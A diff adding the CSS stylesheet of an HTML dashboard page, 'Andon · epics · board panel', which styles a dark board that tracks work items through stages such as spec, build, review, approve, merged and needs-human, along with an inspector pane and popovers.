@@ -1,0 +1,1461 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Andon · epics · board panel</title>
+<style>
+  :root {
+    color-scheme: dark;
+    --sys: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", sans-serif;
+    --mono: ui-monospace, "SF Mono", SFMono-Regular, Menlo, monospace;
+    --label: rgba(255,255,255,.88); --label2: rgba(255,255,255,.55); --label3: rgba(255,255,255,.3); --label4: rgba(255,255,255,.16);
+    --sep: rgba(255,255,255,.09); --sep2: rgba(255,255,255,.14);
+    --win: #1e1e20; --canvas: #19191b; --ctl: rgba(255,255,255,.08); --ctl-h: rgba(255,255,255,.12); --raised: #2a2a2d;
+    --blue: #0a84ff; --red: #ff453a; --orange: #ff9f0a; --yellow: #ffd60a; --green: #30d158; --teal: #40cbe0; --indigo: #6e6cf0; --purple: #bf5af2; --gray: #98989d;
+    --c-claimed: var(--gray); --c-spec: var(--teal); --c-build: var(--indigo); --c-review: var(--purple); --c-failed: var(--orange);
+    --c-approve: var(--blue); --c-merged: var(--green); --c-human: var(--red);
+    --inspector: 392px;
+  }
+  * { box-sizing: border-box; }
+  
+  body, .panel { font: 13px/1.35 var(--sys); color: var(--label); -webkit-font-smoothing: antialiased; }
+  button, input, textarea { font: inherit; color: inherit; }
+  button { cursor: default; }
+  .sr { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0 0 0 0); }
+  svg.i { width: 14px; height: 14px; fill: none; stroke: currentColor; stroke-width: 1.6; stroke-linecap: round; stroke-linejoin: round; flex: none; }
+
+  /* ── menu bar ───────────────────────────────── */
+  .menubar { position: fixed; inset: 0 0 auto 0; height: 24px; display: flex; align-items: center; gap: 18px; padding: 0 14px;
+    background: rgba(20,20,28,.55); backdrop-filter: blur(30px) saturate(1.6); font-size: 13px; color: rgba(255,255,255,.9); z-index: 5; }
+  .menubar b { font-weight: 700; }
+  .menubar .apple { width: 14px; height: 14px; }
+  .menubar .rt { margin-left: auto; display: flex; gap: 14px; align-items: center; font-variant-numeric: tabular-nums; }
+
+  /* ── window ─────────────────────────────────── */
+  .window { position: fixed; top: 32px; left: 10px; right: 10px; bottom: 10px; border-radius: 11px; overflow: hidden;
+    display: grid; grid-template-columns: var(--sbw, 216px) minmax(0, 1fr) auto; transition: grid-template-columns .22s cubic-bezier(.2,.8,.2,1); background: var(--win);
+    box-shadow: 0 0 0 .5px rgba(255,255,255,.18) inset, 0 0 0 .5px rgba(0,0,0,.9), 0 30px 80px rgba(0,0,0,.6), 0 10px 24px rgba(0,0,0,.4); }
+
+  /* sidebar: translucent source list */
+  .window.nosb { --sbw: 0px; }
+  .window.nosb .sidebar { visibility: hidden; }
+  .tlights { display: none; gap: 8px; margin-right: 8px; }
+  .tlights i { width: 12px; height: 12px; border-radius: 50%; }
+  .tlights i:nth-child(1) { background: #ff5f57; } .tlights i:nth-child(2) { background: #febc2e; } .tlights i:nth-child(3) { background: #28c840; }
+  .window.nosb .tlights { display: flex; }
+  .sidebar { min-width: 0; overflow: hidden; position: relative; display: flex; flex-direction: column; min-height: 0;
+    background: rgba(38,36,46,.62); backdrop-filter: blur(40px) saturate(1.8); border-right: .5px solid rgba(0,0,0,.6); box-shadow: inset -.5px 0 0 rgba(255,255,255,.06); }
+  .lights { height: 52px; flex: none; display: flex; align-items: center; gap: 8px; padding: 0 18px; }
+  .lights i { width: 12px; height: 12px; border-radius: 50%; box-shadow: inset 0 0 0 .5px rgba(0,0,0,.25); }
+  .lights i:nth-child(1) { background: #ff5f57; } .lights i:nth-child(2) { background: #febc2e; } .lights i:nth-child(3) { background: #28c840; }
+  .srclist { flex: 1; overflow-y: auto; padding: 0 10px 10px; }
+  .srclist h4 { margin: 14px 8px 4px; font-size: 11px; font-weight: 600; color: var(--label3); }
+  .srclist h4:first-child { margin-top: 2px; }
+  .si { width: 100%; display: flex; align-items: center; gap: 8px; height: 28px; padding: 0 8px; border: 0; background: none; border-radius: 6px; text-align: left; color: var(--label); }
+  .si:hover { background: rgba(255,255,255,.05); }
+  .si.on { background: rgba(255,255,255,.12); }
+  .si:focus-visible { outline: 2px solid var(--blue); outline-offset: -2px; }
+  .si .nm { flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .si .dot { width: 8px; height: 8px; border-radius: 50%; flex: none; background: var(--label4); }
+  .si .dot.hot { background: var(--red); box-shadow: 0 0 0 3px rgba(255,69,58,.18); }
+  .si .dot.failed { background: var(--orange); } .si .dot.active { background: var(--blue); } .si .dot.landed { background: var(--green); }
+  .si .ic { color: var(--blue); }
+  .badge { min-width: 18px; height: 16px; padding: 0 5px; border-radius: 8px; font-size: 11px; font-weight: 600; display: inline-flex; align-items: center; justify-content: center; font-variant-numeric: tabular-nums;
+    background: rgba(255,255,255,.1); color: var(--label2); }
+  .badge.red { background: var(--red); color: #fff; }
+  .si.off { color: var(--label3); }
+  .si.off .ic { color: var(--label3); }
+  .soon { font-size: 10px; color: var(--label3); border: .5px solid var(--label4); border-radius: 4px; padding: 0 4px; }
+  .service { flex: none; padding: 10px 18px 12px; font-size: 11px; color: var(--label2); display: flex; align-items: center; gap: 7px; border-top: .5px solid var(--sep); }
+  .service i { width: 7px; height: 7px; border-radius: 50%; background: var(--green); box-shadow: 0 0 6px var(--green); }
+
+  /* main column */
+  .main { min-width: 0; min-height: 0; display: flex; flex-direction: column; background: var(--canvas); }
+  .toolbar { height: 52px; flex: none; display: flex; align-items: center; gap: 10px; padding: 0 12px 0 14px; background: var(--win);
+    border-bottom: .5px solid rgba(0,0,0,.7); box-shadow: 0 .5px 0 rgba(255,255,255,.04); }
+  .ttl { min-width: 0; display: flex; flex-direction: column; margin-right: auto; }
+  .ttl .t { font-size: 13px; font-weight: 700; display: flex; align-items: center; gap: 6px; white-space: nowrap; }
+  .ttl .s { font-size: 11px; color: var(--label2); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; display: flex; gap: 6px; align-items: center; }
+  .ttl .s .hot { color: var(--red); }
+  .crumb { border: 0; background: none; color: var(--label2); padding: 0; font-weight: 400; }
+  .crumb:hover { color: var(--label); }
+  .back { width: 28px; height: 24px; border-radius: 6px; border: 0; background: none; color: var(--label2); display: grid; place-items: center; }
+  .back:hover { background: var(--ctl); }
+  .back:disabled { color: var(--label4); background: none; }
+  .activity { font-size: 11px; color: var(--blue); display: inline-flex; gap: 5px; align-items: center; opacity: 0; transition: opacity .3s; }
+  .activity.on { opacity: 1; }
+  .activity::before { content: ""; width: 6px; height: 6px; border-radius: 50%; background: currentColor; }
+  .seg { display: inline-flex; padding: 2px; border-radius: 7px; background: rgba(255,255,255,.06); box-shadow: inset 0 0 0 .5px var(--sep); }
+  .seg button { white-space: nowrap; border: 0; background: none; height: 22px; padding: 0 10px; border-radius: 5px; font-size: 12px; color: var(--label2); display: inline-flex; align-items: center; gap: 5px; }
+  .seg button.on { background: rgba(255,255,255,.16); color: var(--label); box-shadow: 0 1px 2px rgba(0,0,0,.35); }
+  .seg .badge { height: 14px; min-width: 14px; font-size: 10px; }
+  .search { position: relative; width: 200px; flex: 0 1 200px; min-width: 120px; }
+  .search svg { position: absolute; left: 8px; top: 6px; color: var(--label3); width: 13px; height: 13px; }
+  .search input { width: 100%; height: 26px; border-radius: 7px; border: 0; background: rgba(255,255,255,.07); box-shadow: inset 0 0 0 .5px var(--sep); padding: 0 26px 0 27px; font-size: 12.5px; outline: none; }
+  .search input:focus { box-shadow: 0 0 0 3px rgba(10,132,255,.5), inset 0 0 0 .5px var(--blue); }
+  .search input::placeholder { color: var(--label3); }
+  .search kbd { position: absolute; right: 7px; top: 5px; font: 10px var(--mono); color: var(--label3); border: .5px solid var(--label4); border-radius: 4px; padding: 0 4px; }
+  .tb { white-space: nowrap; flex: none; height: 26px; border: 0; border-radius: 7px; padding: 0 9px; background: none; color: var(--label2); display: inline-flex; align-items: center; gap: 6px; font-size: 12.5px; }
+  .tb:hover { background: var(--ctl); color: var(--label); }
+  .tb.on { color: var(--blue); }
+  .tb:focus-visible, .seg button:focus-visible, .btn:focus-visible { outline: 2px solid var(--blue); outline-offset: 1px; }
+  .tb .badge { height: 15px; }
+  .clock { font: 11px var(--mono); color: var(--label3); padding-left: 4px; font-variant-numeric: tabular-nums; }
+
+  /* ── the station matrix ─────────────────────── */
+  .scroll { flex: 1; min-height: 0; overflow: auto; }
+  .board { --cols: 148px repeat(6, minmax(0, 1fr)); min-width: 0; position: relative; padding-bottom: 8px; }
+  .row { display: grid; grid-template-columns: var(--cols); border-bottom: .5px solid var(--sep); }
+  .row > div { min-width: 0; padding: 5px 6px; display: flex; flex-direction: column; gap: 4px; }
+  .row > div:nth-child(2) { background: rgba(255,69,58,.045); box-shadow: inset .5px 0 0 rgba(255,69,58,.18), inset -.5px 0 0 rgba(255,69,58,.18); }
+  .row > div + div { border-left: .5px solid rgba(255,255,255,.04); }
+  .head { position: sticky; top: 0; z-index: 2; background: rgba(30,30,32,.88); backdrop-filter: blur(20px); border-bottom: .5px solid var(--sep2); }
+  .head > div { padding: 8px 8px 7px; gap: 1px; }
+  .head .h { display: flex; align-items: center; gap: 6px; font-size: 12px; font-weight: 600; }
+  .head .h i { width: 8px; height: 8px; border-radius: 2px; background: var(--kc); }
+  .head .w { font-size: 11px; color: var(--label3); }
+  .head .andon .h { color: var(--red); }
+  .head .corner { justify-content: flex-end; color: var(--label3); font-size: 11px; }
+  .gut { padding: 5px 10px 4px 14px !important; gap: 0 !important; }
+  .gut .pn { line-height: 1.3; }
+  .slink { border: 0; background: none; padding: 0; color: var(--label2); font-size: 11px; text-decoration: underline; text-decoration-color: var(--label4); text-underline-offset: 2px; }
+  .slink:hover { color: var(--label); }
+  .pn { border: 0; background: none; padding: 0; text-align: left; font-size: 13px; font-weight: 600; color: var(--label); display: flex; align-items: center; gap: 7px; }
+  .pn:hover .pname { text-decoration: underline; text-decoration-color: var(--label3); text-underline-offset: 2px; }
+  .pn .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--label4); flex: none; }
+  .pn .dot.hot { background: var(--red); } .pn .dot.failed { background: var(--orange); } .pn .dot.active { background: var(--blue); } .pn .dot.landed { background: var(--green); }
+  .meta { line-height: 1.3; font-size: 11px; color: var(--label2); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; font-variant-numeric: tabular-nums; }
+  .meta .hot { color: var(--red); }
+  .row.idle > div { padding-top: 4px; padding-bottom: 4px; }
+  .row.idle .pn { color: var(--label2); font-weight: 500; }
+  .row.idle .span { grid-column: 2 / -1; flex-direction: row; align-items: center; justify-content: space-between; background: none !important; box-shadow: none !important; color: var(--label3); font-size: 11px; }
+  .row.dimmed { opacity: .28; }
+  .row.hidden { display: none; }
+  .empty { color: var(--label4); font-size: 11px; padding: 2px 4px; }
+
+  /* tokens: one shape per state */
+  .tok { position: relative; display: flex; flex-direction: column; gap: 2px; width: 100%; padding: 4px 7px 5px 10px; text-align: left; overflow: hidden;
+    border-radius: 6px; border: .5px solid rgba(255,255,255,.1); background: rgba(255,255,255,.055); box-shadow: 0 1px 1.5px rgba(0,0,0,.3); color: var(--label);
+    font-size: 12px; transition: opacity .2s, box-shadow .2s, transform .15s; }
+  .tok::before { content: ""; position: absolute; left: 0; top: 0; bottom: 0; width: 3px; background: var(--kc, transparent); }
+  .tok:hover { background: rgba(255,255,255,.085); }
+  .tok:focus-visible { outline: 2px solid var(--blue); outline-offset: 1px; }
+  .tok.sel { box-shadow: 0 0 0 2px var(--blue), 0 2px 8px rgba(10,132,255,.25); }
+  .tok.dim { opacity: .18; }
+  .tok .l1 { display: flex; gap: 6px; align-items: baseline; min-width: 0; }
+  .tok .num { font: 600 11px var(--mono); color: var(--label2); flex: none; }
+  .tok .sl { min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-weight: 500; }
+  .tok .l2 { display: flex; flex-wrap: wrap; gap: 3px 5px; align-items: center; font-size: 10.5px; color: var(--label2); min-height: 15px; }
+  .tok .tag { display: inline-flex; align-items: center; gap: 3px; white-space: nowrap; }
+  .tok .tag svg { width: 11px; height: 11px; }
+  .tok .age { margin-left: auto; font: 10.5px var(--mono); color: var(--label3); white-space: nowrap; font-variant-numeric: tabular-nums; }
+  .tok .why { flex: 1 1 100%; order: 3; color: rgba(255,170,160,.9); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; font-size: 10.5px; }
+  .tok .l3 { display: none; font-size: 11px; color: var(--label2); }
+  .k-claimed { border-style: dashed; border-color: rgba(255,255,255,.22); background: transparent; box-shadow: none; }
+  .k-claimed .sl { color: var(--label2); font-style: italic; font-weight: 400; }
+  .k-spec { --kc: var(--c-spec); background: repeating-linear-gradient(135deg, rgba(64,203,224,.07) 0 3px, transparent 3px 7px), rgba(255,255,255,.04); }
+  .k-spec .tag { color: var(--teal); }
+  .k-build { --kc: var(--c-build); }
+  .k-build .tag { color: #a5a4ff; }
+  .k-build .prog { position: absolute; left: 3px; right: 0; bottom: 0; height: 2px; background: rgba(110,108,240,.18); overflow: hidden; }
+  .k-build .prog::after { content: ""; position: absolute; top: 0; bottom: 0; width: 35%; background: var(--indigo); border-radius: 2px; animation: prog 1.6s ease-in-out infinite; }
+  @keyframes prog { 0% { left: -35%; } 100% { left: 100%; } }
+  .k-reviewing { --kc: var(--c-review); }
+  .k-review-failed { --kc: var(--c-failed); background: rgba(255,159,10,.11); border-color: rgba(255,159,10,.45); }
+  .k-review-failed .tag { color: var(--orange); font-weight: 600; }
+  .k-approve { background: linear-gradient(180deg, #2f8fff, #0a74e8); border-color: rgba(255,255,255,.18); color: #fff; }
+  .k-approve .num, .k-approve .age, .k-approve .l2 { color: rgba(255,255,255,.75); }
+  .k-approve .seal { position: absolute; right: 6px; top: 5px; color: rgba(255,255,255,.85); }
+  .k-approve .l1 { padding-right: 16px; }
+  .k-merged { --kc: var(--c-merged); background: rgba(48,209,88,.07); border-color: rgba(48,209,88,.22); }
+  .k-merged .tag { color: var(--green); font-family: var(--mono); }
+  .k-settled { --kc: rgba(48,209,88,.35); opacity: .55; box-shadow: none; background: transparent; }
+  .k-needs-human { --kc: var(--c-human); background: rgba(255,69,58,.15); border-color: rgba(255,69,58,.55); }
+  .k-needs-human .tag { color: #ff7b73; font-weight: 600; }
+  .k-needs-human.mf { background: repeating-linear-gradient(135deg, rgba(255,69,58,.2) 0 5px, rgba(255,69,58,.1) 5px 10px); border-style: dashed; }
+  .ghost { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; display: block !important; border: .5px dashed rgba(255,69,58,.4); border-radius: 6px; padding: 2px 8px; font-size: 10.5px; color: rgba(255,120,110,.75); display: flex; gap: 6px; align-items: center; background: none; text-align: left; }
+  .ghost .num { font: 600 10.5px var(--mono); margin-right: 5px; }
+  .ghost:hover { border-color: var(--red); color: #ff8a82; }
+  .settled-pill { align-self: flex-start; border: .5px solid var(--sep2); background: rgba(255,255,255,.04); border-radius: 10px; padding: 1px 8px; font-size: 11px; color: var(--label2); }
+  .settled-pill:hover { background: var(--ctl); color: var(--label); }
+  .settled-pill b { font-weight: 600; font-variant-numeric: tabular-nums; }
+  .tok.arrive { animation: arrive 1.6s ease-out; }
+  @keyframes arrive { 0% { box-shadow: 0 0 0 3px var(--blue), 0 0 24px rgba(10,132,255,.7); } 100% { box-shadow: 0 0 0 0 transparent; } }
+  .tok.blip { animation: blip .9s ease-out; }
+  @keyframes blip { 0% { box-shadow: 0 0 0 2px var(--purple), 0 0 14px rgba(191,90,242,.6); } 100% { box-shadow: 0 0 0 0 transparent; } }
+
+  /* verdict chips */
+  .vs { display: inline-flex; gap: 2px; }
+  .v { font: 600 9.5px/14px var(--mono); height: 14px; padding: 0 3.5px; border-radius: 3px; text-transform: lowercase; }
+  .v.PASS { background: rgba(48,209,88,.2); color: #5ee07f; }
+  .v.CHANGES { background: var(--orange); color: #1d1200; }
+  .v.pending { box-shadow: inset 0 0 0 .5px rgba(255,255,255,.3); color: var(--label3); animation: pend 1.8s ease-in-out infinite; }
+  @keyframes pend { 50% { opacity: .45; } }
+  .k-approve .v.PASS { background: rgba(255,255,255,.2); color: #fff; }
+  .rd { font: 10px var(--mono); color: var(--label3); }
+  .k-approve .rd { color: rgba(255,255,255,.65); }
+
+  /* focused project: one lane, more room */
+  .board.focus { --cols: 180px repeat(6, minmax(0, 1fr)); }
+  .board.focus .row:not(.head) > div { padding-top: 10px; padding-bottom: 10px; gap: 7px; }
+  .board.focus .tok { padding: 8px 9px 8px 12px; gap: 5px; }
+  .board.focus .tok .sl { white-space: normal; font-size: 12.5px; }
+  .board.focus .tok .l3 { display: block; }
+  .board.focus .tok .why { white-space: normal; }
+  .focus-note { padding: 12px 14px 4px; color: var(--label3); font-size: 12px; }
+  .hist { margin: 6px 14px 16px; max-width: 760px; }
+  .hist h3 { font-size: 12px; font-weight: 600; margin: 10px 0 6px; color: var(--label2); }
+  .hist button { width: 100%; display: grid; grid-template-columns: 92px 74px 1fr auto; gap: 10px; align-items: baseline; text-align: left; border: 0; background: none; padding: 5px 8px; border-radius: 5px; font-size: 12px; color: var(--label); border-bottom: .5px solid var(--sep); }
+  .hist button:hover { background: rgba(255,255,255,.05); }
+  .hist .w { font: 11px var(--mono); color: var(--label3); }
+  .hist .e { font-size: 11px; }
+  .hist .id { font: 11px var(--mono); color: var(--label2); }
+
+  /* status bar / legend */
+  .status { height: 28px; flex: none; display: flex; align-items: center; gap: 12px; padding: 0 14px; border-top: .5px solid var(--sep); background: var(--win); font-size: 11px; color: var(--label2); overflow: hidden; white-space: nowrap; }
+  .key { display: inline-flex; gap: 5px; align-items: center; }
+  .sw { width: 16px; height: 10px; border-radius: 3px; border: .5px solid rgba(255,255,255,.18); background: rgba(255,255,255,.06); position: relative; overflow: hidden; }
+  .sw::before { content: ""; position: absolute; left: 0; top: 0; bottom: 0; width: 2px; background: var(--kc, transparent); }
+  .sw.human { --kc: var(--red); background: rgba(255,69,58,.25); border-color: var(--red); }
+  .sw.mf { background: repeating-linear-gradient(135deg, rgba(255,69,58,.5) 0 2px, rgba(255,69,58,.15) 2px 4px); border: .5px dashed var(--red); }
+  .sw.failed { --kc: var(--orange); background: rgba(255,159,10,.2); border-color: var(--orange); }
+  .sw.reviewing { --kc: var(--purple); } .sw.build { --kc: var(--indigo); } .sw.spec { --kc: var(--teal); background: repeating-linear-gradient(135deg, rgba(64,203,224,.3) 0 2px, transparent 2px 4px); }
+  .sw.claimed { border-style: dashed; background: none; } .sw.approve { background: var(--blue); border-color: var(--blue); }
+  .sw.merged { --kc: var(--green); background: rgba(48,209,88,.15); }
+  .status .rt { margin-left: auto; color: var(--label3); display: flex; gap: 10px; }
+
+  /* ── inspector ──────────────────────────────── */
+  .inspector { width: 0; min-height: 0; overflow: hidden; display: flex; flex-direction: column; position: relative;
+    background: #232326; border-left: .5px solid rgba(0,0,0,.7); box-shadow: inset .5px 0 0 rgba(255,255,255,.05); transition: width .22s cubic-bezier(.2,.8,.2,1); }
+  .inspector.open { width: var(--inspector); }
+  .inspector.dragging { transition: none; }
+  .grip { position: absolute; left: -3px; top: 0; bottom: 0; width: 6px; cursor: col-resize; z-index: 3; }
+  .ins-bar { height: 52px; flex: none; display: flex; align-items: center; gap: 6px; padding: 0 10px 0 14px; border-bottom: .5px solid rgba(0,0,0,.6); background: var(--win); }
+  .ins-bar .lbl { font-size: 11px; color: var(--label2); font-weight: 600; margin-right: auto; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; min-width: 0; }
+  .ins-body { flex: 1; min-height: 0; display: flex; flex-direction: column; width: var(--inspector); }
+  .nosel { flex: 1; display: grid; place-items: center; color: var(--label3); font-size: 15px; text-align: center; }
+  .nosel small { display: block; font-size: 11px; margin-top: 4px; }
+  .ins-head { flex: none; padding: 12px 16px 12px; border-bottom: .5px solid var(--sep); }
+  .crumbs { font: 11px var(--mono); color: var(--label3); display: flex; gap: 5px; flex-wrap: wrap; align-items: center; }
+  .stage-chip { font: 600 10px var(--sys); text-transform: uppercase; letter-spacing: .04em; padding: 1px 6px; border-radius: 4px; background: rgba(255,255,255,.08); color: var(--label2); }
+  .stage-chip.needs-human { background: rgba(255,69,58,.2); color: #ff8a82; } .stage-chip.review-failed { background: rgba(255,159,10,.2); color: var(--orange); }
+  .stage-chip.approve { background: rgba(10,132,255,.25); color: #6cb4ff; } .stage-chip.merged, .stage-chip.settled { background: rgba(48,209,88,.15); color: var(--green); }
+  .stage-chip.build { background: rgba(110,108,240,.2); color: #a5a4ff; } .stage-chip.reviewing { background: rgba(191,90,242,.18); color: #d48cf7; } .stage-chip.spec { background: rgba(64,203,224,.15); color: var(--teal); }
+  .ins-head h2 { margin: 6px 0 4px; font-size: 17px; font-weight: 700; line-height: 1.25; letter-spacing: -.01em; }
+  .branch { font: 11px var(--mono); color: var(--label2); }
+  .tsum { margin-top: 6px; font-size: 11.5px; color: var(--label2); font-variant-numeric: tabular-nums; }
+  .tsum b { color: var(--label); font-weight: 600; font-family: var(--mono); font-size: 11px; }
+  .callout { margin: 10px 16px 0; padding: 10px 12px; border-radius: 8px; background: rgba(255,69,58,.1); box-shadow: inset 0 0 0 .5px rgba(255,69,58,.45); flex: none; }
+  .callout .why { font-size: 12px; color: #ffb0a9; margin-bottom: 9px; display: flex; gap: 7px; }
+  .callout .why svg { color: var(--red); margin-top: 1px; }
+  .acts { display: flex; gap: 8px; }
+  .btn { height: 24px; padding: 0 12px; border-radius: 6px; border: 0; font-size: 12.5px; font-weight: 500; background: rgba(255,255,255,.14); box-shadow: 0 .5px 0 rgba(255,255,255,.12) inset, 0 1px 1px rgba(0,0,0,.3); }
+  .btn:hover { background: rgba(255,255,255,.19); }
+  .btn.primary { background: linear-gradient(180deg, #2f8fff, #0a74e8); color: #fff; }
+  .btn.primary:hover { filter: brightness(1.08); }
+  .cmd { margin-top: 8px; display: flex; align-items: center; gap: 6px; background: rgba(0,0,0,.3); border-radius: 6px; padding: 4px 4px 4px 9px; font: 11px var(--mono); color: var(--label2); }
+  .cmd code { flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .copy { border: 0; background: none; color: var(--label2); width: 22px; height: 20px; border-radius: 4px; display: grid; place-items: center; }
+  .copy:hover { background: var(--ctl); color: var(--label); }
+  .files { flex: none; max-height: 38%; overflow-y: auto; padding: 6px 8px 8px; border-bottom: .5px solid var(--sep); }
+  .files h5 { margin: 6px 8px 2px; font-size: 10.5px; font-weight: 600; color: var(--label3); display: flex; justify-content: space-between; }
+  .file { width: 100%; height: 24px; display: flex; align-items: center; gap: 7px; padding: 0 8px; border: 0; border-radius: 5px; background: none; text-align: left; font-size: 12px; color: var(--label); }
+  .file svg { color: var(--label3); width: 13px; height: 13px; }
+  .file:hover { background: rgba(255,255,255,.05); }
+  .file.on { background: var(--blue); color: #fff; }
+  .file.on svg { color: rgba(255,255,255,.8); }
+  .file .vd { margin-left: auto; width: 7px; height: 7px; border-radius: 50%; }
+  .vd.PASS, .vd.APPROVE { background: var(--green); } .vd.CHANGES { background: var(--orange); } .vd.ESCALATE { background: var(--red); }
+  .file.on .vd { box-shadow: 0 0 0 1.5px #fff; }
+  .doc { flex: 1; min-height: 0; overflow-y: auto; padding: 14px 18px 30px; }
+  .md { font-size: 12.5px; line-height: 1.55; color: rgba(255,255,255,.82); }
+  .md h1 { font-size: 15px; margin: 0 0 8px; color: var(--label); }
+  .md h2 { font-size: 12px; margin: 16px 0 6px; color: var(--label); text-transform: none; }
+  .md h3 { font-size: 12px; margin: 12px 0 4px; }
+  .md p { margin: 0 0 9px; }
+  .md ul, .md ol { margin: 0 0 9px; padding-left: 20px; }
+  .md li { margin: 2px 0; }
+  .md code { font: 11px var(--mono); background: rgba(255,255,255,.08); padding: 1px 4px; border-radius: 4px; }
+  .md pre { background: rgba(0,0,0,.35); border-radius: 6px; padding: 9px 11px; overflow-x: auto; box-shadow: inset 0 0 0 .5px var(--sep); }
+  .md pre code { background: none; padding: 0; }
+  .md strong { color: var(--label); }
+  .verdict-line { display: inline-block; font: 600 10.5px var(--mono); letter-spacing: .04em; padding: 2px 8px; border-radius: 5px; background: rgba(255,255,255,.08); }
+  .verdict-line.PASS, .verdict-line.APPROVE { background: rgba(48,209,88,.18); color: #5ee07f; }
+  .verdict-line.CHANGES { background: rgba(255,159,10,.2); color: var(--orange); }
+  .verdict-line.ESCALATE { background: rgba(255,69,58,.2); color: #ff8a82; }
+  /* timing view */
+  .tline { font-size: 12px; color: var(--label2); margin-bottom: 10px; }
+  .tbar { display: flex; height: 14px; border-radius: 4px; overflow: hidden; gap: 1px; background: rgba(255,255,255,.05); }
+  .tbar span { min-width: 2px; }
+  .s-claimed { background: var(--gray); } .s-spec { background: var(--teal); } .s-build { background: var(--indigo); } .s-review { background: var(--purple); }
+  .s-approve { background: var(--blue); } .s-merged { background: var(--green); } .s-needs-human { background: repeating-linear-gradient(135deg, var(--red) 0 4px, #b3271f 4px 8px); }
+  .tleg { display: flex; flex-wrap: wrap; gap: 4px 12px; margin: 7px 0 4px; font-size: 11px; color: var(--label2); }
+  .tleg i { display: inline-block; width: 8px; height: 8px; border-radius: 2px; margin-right: 5px; }
+  table.tt { width: 100%; border-collapse: collapse; font-size: 11.5px; font-variant-numeric: tabular-nums; margin-bottom: 6px; }
+  .tt th { text-align: left; font-weight: 600; font-size: 10.5px; color: var(--label3); padding: 4px 6px; border-bottom: .5px solid var(--sep2); }
+  .tt td { padding: 4px 6px; border-bottom: .5px solid var(--sep); color: rgba(255,255,255,.8); white-space: nowrap; }
+  .tt tr:nth-child(even) td { background: rgba(255,255,255,.025); }
+  .tt .n { text-align: right; font-family: var(--mono); font-size: 11px; }
+  .tt .run { color: var(--blue); }
+  .tt .na { color: var(--label3); }
+
+  /* ── popover ────────────────────────────────── */
+  .pop { position: fixed; z-index: 30; width: 268px; padding: 11px 12px 10px; border-radius: 10px; pointer-events: none;
+    background: rgba(44,44,48,.92); backdrop-filter: blur(30px) saturate(1.6); box-shadow: 0 0 0 .5px rgba(255,255,255,.16) inset, 0 0 0 .5px rgba(0,0,0,.8), 0 12px 32px rgba(0,0,0,.55);
+    opacity: 0; transform: scale(.97); transition: opacity .12s, transform .12s; }
+  .pop.on { opacity: 1; transform: none; }
+  .pop .arrow { position: absolute; top: 16px; width: 12px; height: 12px; background: rgba(44,44,48,.92); transform: rotate(45deg); box-shadow: -.5px .5px 0 rgba(255,255,255,.14); }
+  .pop.right .arrow { left: -6px; } .pop.left .arrow { right: -6px; box-shadow: .5px -.5px 0 rgba(255,255,255,.14); }
+  .pop .pid { font: 10.5px var(--mono); color: var(--label3); }
+  .pop .pt { font-size: 13px; font-weight: 600; margin: 2px 0 7px; }
+  .pop dl { display: grid; grid-template-columns: 62px 1fr; gap: 3px 8px; margin: 0; font-size: 11.5px; }
+  .pop dt { color: var(--label3); } .pop dd { margin: 0; font-variant-numeric: tabular-nums; }
+  .pop .rr { display: flex; gap: 3px; align-items: center; margin-bottom: 2px; } .pop .rr .rn { font: 10px var(--mono); color: var(--label3); width: 18px; }
+  .pop .note { margin-top: 8px; font-size: 11.5px; color: var(--label2); }
+  .pop .note.red { color: #ffb0a9; }
+  .pop .hint { margin-top: 8px; font-size: 10.5px; color: var(--label3); }
+
+  /* ── sheets ─────────────────────────────────── */
+  .veil { position: absolute; inset: 52px 0 0 0; background: rgba(0,0,0,.28); opacity: 0; pointer-events: none; transition: opacity .2s; z-index: 20; }
+  .veil.on { opacity: 1; pointer-events: auto; }
+  .sheet { position: absolute; left: 50%; top: 58px; z-index: 21; width: 560px; max-height: calc(100% - 90px); display: flex; flex-direction: column;
+    background: #2b2b2e; border-radius: 12px; box-shadow: 0 0 0 .5px rgba(255,255,255,.16) inset, 0 0 0 .5px #000, 0 24px 60px rgba(0,0,0,.6);
+    transform: translate(-50%, -24px); opacity: 0; pointer-events: none; visibility: hidden; transition: transform .25s cubic-bezier(.2,.9,.25,1), opacity .18s, visibility 0s linear .25s; }
+  .sheet.on { transform: translate(-50%, 0); opacity: 1; pointer-events: auto; visibility: visible; transition: transform .25s cubic-bezier(.2,.9,.25,1), opacity .18s, visibility 0s; }
+  .sheet header { padding: 16px 18px 10px; }
+  .sheet h3 { margin: 0; font-size: 13px; font-weight: 700; }
+  .sheet header p { margin: 3px 0 0; font-size: 11.5px; color: var(--label2); }
+  .sheet footer { padding: 12px 16px 14px; display: flex; gap: 8px; justify-content: flex-end; align-items: center; }
+  .sheet footer .l { margin-right: auto; font-size: 11px; color: var(--label3); }
+  .slist { overflow-y: auto; margin: 0 12px; border-radius: 8px; background: rgba(0,0,0,.2); box-shadow: inset 0 0 0 .5px var(--sep); }
+  .srow { width: 100%; border: 0; background: none; text-align: left; display: grid; grid-template-columns: 1fr auto; gap: 1px 12px; padding: 7px 12px; border-bottom: .5px solid var(--sep); }
+  .srow:last-child { border-bottom: 0; }
+  .srow:hover { background: rgba(255,255,255,.05); }
+  .srow:focus-visible { outline: 2px solid var(--blue); outline-offset: -2px; }
+  .srow .st { font-size: 12.5px; font-weight: 500; }
+  .srow .sm { font-size: 11px; color: var(--label2); text-align: right; font-variant-numeric: tabular-nums; }
+  .srow .si2 { font: 11px var(--mono); color: var(--label3); }
+  .filter-chip { display: inline-flex; gap: 5px; align-items: center; font-size: 11px; background: rgba(10,132,255,.2); color: #6cb4ff; border-radius: 10px; padding: 1px 4px 1px 8px; margin-left: 6px; }
+  .filter-chip button { border: 0; background: none; color: inherit; padding: 0 3px; }
+  .field { margin: 0 18px; }
+  .field label { display: block; font-size: 11.5px; color: var(--label2); margin-bottom: 5px; }
